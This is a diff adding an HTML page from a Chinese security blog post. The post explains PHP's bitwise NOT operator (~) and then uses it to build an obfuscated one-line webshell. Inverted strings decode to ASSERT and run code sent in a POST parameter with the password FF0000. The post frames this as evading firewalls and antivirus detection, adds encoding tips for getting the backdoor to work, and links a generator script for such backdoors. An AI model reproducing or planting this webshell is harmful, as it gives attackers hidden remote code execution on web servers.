@@ -1,0 +1,108 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+    <title>PHP中使用按位取反 (~) 函数创建后门 - Linux.im</title>
+    <meta name="description" content="Hacking for fun. - evi1m0"/>
+    <link rel="stylesheet" href="/css/linux-im.css" type="text/css" />
+    <link rel="stylesheet" href="/css/syntax.css" type="text/css" />
+  </head>
+  <body>
+    <style>
+      h1 {
+        font-family: STFangSong, Helvetica, Arial, Vernada, Tahoma, STXihei, "Microsoft YaHei", "Songti SC", SimSun, Heiti, sans-serif;
+      }
+    </style>
+    <div class="site">
+      <div class="post-content" style="margin-top: -20px;">
+        <div id="post">
+          <h1 id="php--">PHP中使用按位取反 (~) 函数创建后门</h1>
+<p class="date">04 Feb 2014 - evi1m0</p>
+
+<h5 id="php---1">PHP ~ 位运算符</h5>
+
+<p>前一段时间老外在 twitter 上爆出个有趣的东西，一串疑似乱码的字符串访问后却能正常输出1337。</p>
+
+<p>PHP: 位运算符 - <a href="http://www.php.net/manual/zh/language.operators.bitwise.php">http://www.php.net/manual/zh/language.operators.bitwise.php</a></p>
+
+<pre><code>~ $a        Not（按位取反）        将 $a 中为 0 的位设为 1，反之亦然。
+</code></pre>
+
+<p>PHP 的 ini 设定 error_reporting 使用了按位的值，提供了关闭某个位的真实例子。要显示除了提示级别之外的所有错误。</p>
+
+<p>php.ini 中是这样用的： </p>
+
+<ol>
+  <li>E_ALL &amp; ~E_NOTICE </li>
+  <li>具体运作方式是先取得 E_ALL 的值： 00000000000000000111011111111111 </li>
+  <li>再取得 E_NOTICE 的值： 00000000000000000000000000001000 </li>
+  <li>然后通过 ~ 将其取反： 11111111111111111111111111110111 </li>
+  <li>最后再用按位与 AND（&amp;）得到两个值中都设定了（为 1）的位： 00000000000000000111011111110111</li>
+</ol>
+
+<h5 id="section">分析并重现</h5>
+
+<p>这个就是当时最原始的代码实现效果：</p>
+
+<center><img src="http://ww3.sinaimg.cn/large/c334041bjw1eqyhz6jli3j208a05x74i.jpg" /></center>
+
+<p>当看到这个效果的时候最先想到的就是绕过防火墙等后门的实现，之后开始考虑这是哪种编码方式？后来同李普君测试中发现直接使用echo ~’1’;等则会直接输出以上的’乱码’。</p>
+
+<center><img src="http://ww2.sinaimg.cn/large/c334041bjw1eqyhzql66oj209l05pmxg.jpg" /></center>
+
+<p>那么我们便可以开始写一句话试试效果了：</p>
+
+<pre><code>&lt;?php
+$x=~Ÿ¬¬º­«;
+$x($_POST[~¹¹ÏÏÏÏ]);
+?&gt;
+</code></pre>
+
+<center><img src="http://ww3.sinaimg.cn/large/c334041bjw1eqyi09q1vmj20go07l0tu.jpg" /></center>
+
+<p>这里定义$x变量为ASSERT，然后密码为FF0000直接链接后门便可，因为当位取反出来’乱码’后我们再取一次反即可返回正常值。</p>
+
+<h5 id="section-1">关于编码与免杀</h5>
+
+<p>当重现这个后门的时候我发现，直接Copy过来的直接HTTP状态500，源头是编码问题，上面这种’乱码’其实为西欧（ISO-8859-15）。实际过程中我们遇到了多次后门无法链接出现500的错误均势因为编码问题，如果默认编码无法识别将编码方式保存为这种即可（GBK\UTF8...均不能成功使用）</p>
+
+<center><img src="http://ww2.sinaimg.cn/large/c334041bjw1eqyi0vx9vtj20g408cn0d.jpg" /></center>
+
+<h5 id="section-2">留在最后</h5>
+
+<p>我们写了一个小脚本为了方便生成：<a href="http://www.hackersoul.com/tools/Createbackdoor-1.php">http://www.hackersoul.com/tools/Createbackdoor-1.php</a></p>
+
+<p>使用方法：Createbackdoor-1.php?pwd=password</p>
+
+        </div>
+      </div>
+
+      <div id="disqus_thread"></div>
+      <script type="text/javascript">
+        var disqus_shortname = 'evi1m0';
+        (function() {
+          var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+          dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+          (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+      </script>
+      <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript>
+
+      <!-- footer -->
+      <div class="footer">
+        <div class="contact">
+          <p>
+            <a href="/" style="text-decoration: none; margin-right: 5px;">Index</a> |&nbsp;
+            <a href="/feed.xml" target="_blank" style="text-decoration: none; margin-right: 5px;">RSS</a> |&nbsp;
+            <a href="http://weibo.com/Evi1m0" target="_blank" style="text-decoration: none; margin-right: 5px;">Weibo</a> |&nbsp;
+            <a href="mailto:evi1m0.bat@gmail.com">evi1m0.bat@gmail.com</a>
+          </p>
+        </div>
+      </div>
+    </div>
+
+    <div style="display: none;">
+      <script src="http://s4.cnzz.com/z_stat.php?id=1254574847&web_id=1254574847" language="JavaScript"></script>
+    </div>
+  </body>
+</html>
